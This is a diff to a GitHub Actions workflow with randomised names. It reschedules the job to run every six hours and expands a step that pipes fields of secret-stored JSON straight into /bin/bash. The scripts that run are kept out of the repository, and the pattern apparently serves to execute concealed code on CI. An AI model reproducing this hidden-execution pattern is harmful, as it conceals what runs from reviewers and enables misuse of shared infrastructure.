@@ -1,8 +1,10 @@
 name: xingtianyuan4567
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 4/6 * * *'
+    - cron: '45 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +13,25 @@ jobs:
       - uses: actions/checkout@v4
       - name: xingtianyuan4567
         env:
-          moqby98: ${{ secrets.moqby98 }}
+          kc2: ${{ secrets.kc2 }}
         run: |
-          echo $moqby98 | jq -r .biz9 | /bin/bash
-          echo $qnldr08 | jq -r .gumr29 | /bin/bash
-          echo $n21457 | jq -r .xjgoe31 | /bin/bash
-          echo $l49 | jq -r .rsvwp2 | /bin/bash
-          echo $d36 | jq -r .ny2 | /bin/bash
+          echo $kc2 | jq -r .ru2194 | /bin/bash
+          echo $ju5 | jq -r .op63 | /bin/bash
+          echo $p8 | jq -r .nupn97 | /bin/bash
+          echo $u3 | jq -r .raof00 | /bin/bash
+          echo $elx76 | jq -r .kz9 | /bin/bash
+          echo $zcz97252 | jq -r .uf99 | /bin/bash
+          echo $dzet374 | jq -r .vbg1683 | /bin/bash
+          echo $eqmt62183 | jq -r .klc747 | /bin/bash
+          echo $zkjmq700 | jq -r .y2843 | /bin/bash
+          echo $gkgds91092 | jq -r .h7187 | /bin/bash
+          echo $p806 | jq -r .a069 | /bin/bash
+          echo $nkr9 | jq -r .bgkd270 | /bin/bash
+          echo $xctlt489 | jq -r .hoez43027 | /bin/bash
+          echo $lk014 | jq -r .brqrk5964 | /bin/bash
+          echo $tawm21 | jq -r .m23 | /bin/bash
+          echo $vkx4890 | jq -r .b974 | /bin/bash
+          echo $czx093 | jq -r .udyrh8088 | /bin/bash
+          echo $prwz3665 | jq -r .wtv400 | /bin/bash
+          echo $f425 | jq -r .zix7 | /bin/bash
 
